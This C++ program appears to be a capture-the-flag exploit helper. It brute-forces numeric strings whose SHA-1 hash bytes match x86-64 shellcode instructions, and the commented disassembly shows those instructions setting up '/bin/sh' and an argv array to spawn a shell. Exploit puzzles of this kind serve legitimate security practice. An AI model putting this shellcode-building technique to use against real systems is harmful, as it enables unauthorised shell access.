#include <stdio.h>

#include <openssl/sha.h>

#include <string>
#include <vector>

using namespace std;

unsigned char WANTED[][3] = {
  //   4004ca:	48 89 c8             	mov    %rcx,%rax
  { 0x48,0x89,0xc8 },
  //   4004cd:	48 89 c6             	mov    %rax,%rsi
  { 0x48,0x89,0xc6 },
  //   4004d0:	48 89 c2             	mov    %rax,%rdx
  { 0x48,0x89,0xc2 },
  //   4004d3:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004d6:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004d9:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004dc:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004df:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004e2:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004e5:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004e8:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004eb:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004ee:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004f1:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004f4:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004f7:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004fa:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   4004fd:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   400500:	48 ff c2             	inc    %rdx
  { 0x48,0xff,0xc2 },
  //   400503:	48 89 10             	mov    %rdx,(%rax)
  { 0x48,0x89,0x10 },
  //   400506:	48 83 c0 08          	add    $0x8,%rax
  //   40050a:	48 31 d2             	xor    %rdx,%rdx
  { 0x48,0x31,0xd2 },
  //   40050d:	48 89 10             	mov    %rdx,(%rax)
  { 0x48,0x89,0x10 },
  //   400510:	48 83 c0 08          	add    $0x8,%rax
  //   400514:	48 89 c7             	mov    %rax,%rdi
  { 0x48,0x89,0xc7 },
  //   400517:	c6 00 2f             	movb   $0x2f,(%rax)
  { 0xc6,0x00,0x2f },
  //   40051a:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   40051d:	c6 00 62             	movb   $0x62,(%rax)
  { 0xc6,0x00,0x62 },
  //   400520:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   400523:	c6 00 69             	movb   $0x69,(%rax)
  { 0xc6,0x00,0x69 },
  //   400526:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   400529:	c6 00 6e             	movb   $0x6e,(%rax)
  { 0xc6,0x00,0x6e },
  //   40052c:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   40052f:	c6 00 2f             	movb   $0x2f,(%rax)
  { 0xc6,0x00,0x2f },
  //   400532:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   400535:	c6 00 73             	movb   $0x73,(%rax)
  { 0xc6,0x00,0x73 },
  //   400538:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   40053b:	c6 00 68             	movb   $0x68,(%rax)
  { 0xc6,0x00,0x68 },
  //   40053e:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   400541:	c6 00 00             	movb   $0x0,(%rax)
  { 0xc6,0x00,0x00 },
  //   400544:	48 ff c0             	inc    %rax
  { 0x48,0xff,0xc0 },
  //   400547:	48 89 f2             	mov    %rsi,%rdx
  { 0x48,0x89,0xf2 },
  //   40054a:	48 31 c0             	xor    %rax,%rax
  { 0x48,0x31,0xc0 },
  { 0,0,0 }
};

int main() {
  int wn;
  for (wn = 0; WANTED[wn][0]; wn++) {}

  vector<string> strs;
  strs.resize(wn);

  unsigned char buf[99];
  unsigned char sha[99];
  int fn = 0;
  for (int i = 0; i < (1<<30) && wn != fn; i++) {
    sprintf((char*)buf, "%016d", i);
    SHA1(buf, 16, sha);

    for (int j = 0; j < wn; j++) {
      unsigned char* w = WANTED[j];
      if (w[0] == sha[17] && w[1] == sha[18] && w[2] == sha[19] && w[0]) {
        w[0] = 0;
        fn++;
        strs[j] = (char*)buf;
      }
    }
  }

  for (int i = 0; i < wn; i++) {
    printf("%s\n", strs[i].c_str());
  }
}
